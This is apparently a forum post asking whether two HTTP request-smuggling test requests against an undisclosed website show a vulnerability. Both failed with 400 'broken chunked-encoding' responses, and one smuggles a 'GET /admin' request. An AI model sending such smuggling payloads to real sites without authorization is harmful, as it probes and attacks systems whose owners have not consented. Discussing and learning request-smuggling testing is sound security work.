@@ -1,0 +1,129 @@
+POST ID: 15ar9ow / POST TITLE: Possible HTTP Smuggling Confirmation, or False Positive?
+====================================================================================================
+Hey Guys!  
+
+
+After poking a website (undisclosed) for HTTP Smuggling vulnerabilities, this is the result I got. Does this prove a vulnerability?
+
+&#x200B;
+
+I was running a crafted python script to get these results
+
+&#x200B;
+
+Test case 1:
+
+&#x200B;
+
+Request:
+
+POST / HTTP/1.1
+
+&#x200B;
+
+Host: UNDISCLOSED
+
+&#x200B;
+
+Transfer-Encoding: chunked
+
+&#x200B;
+
+&#x200B;
+
+&#x200B;
+
+5
+
+&#x200B;
+
+param1
+
+&#x200B;
+
+0
+
+&#x200B;
+
+&#x200B;
+
+&#x200B;
+
+GET /admin HTTP/1.1
+
+&#x200B;
+
+Host: UNDISCLOSED
+
+&#x200B;
+
+Response Status Code: 400
+
+&#x200B;
+
+Response Body:
+
+broken chunked-encoding
+
+&#x200B;
+
+\--------------------------------------------------------------------------------------------------------------------------------------------
+
+&#x200B;
+
+Test case 2:
+
+&#x200B;
+
+Request:
+
+GET / HTTP/1.1
+
+&#x200B;
+
+Host:
+
+&#x200B;
+
+Transfer-Encoding: chunked
+
+&#x200B;
+
+&#x200B;
+
+&#x200B;
+
+4
+
+&#x200B;
+
+abcd
+
+&#x200B;
+
+0
+
+&#x200B;
+
+&#x200B;
+
+&#x200B;
+
+&#x200B;
+
+&#x200B;
+
+Response Status Code: 400
+
+&#x200B;
+
+Response Body:
+
+broken chunked-encoding
+
+&#x200B;
+
+&#x200B;
+
+POST COMMENTS:
+====================================================================================================
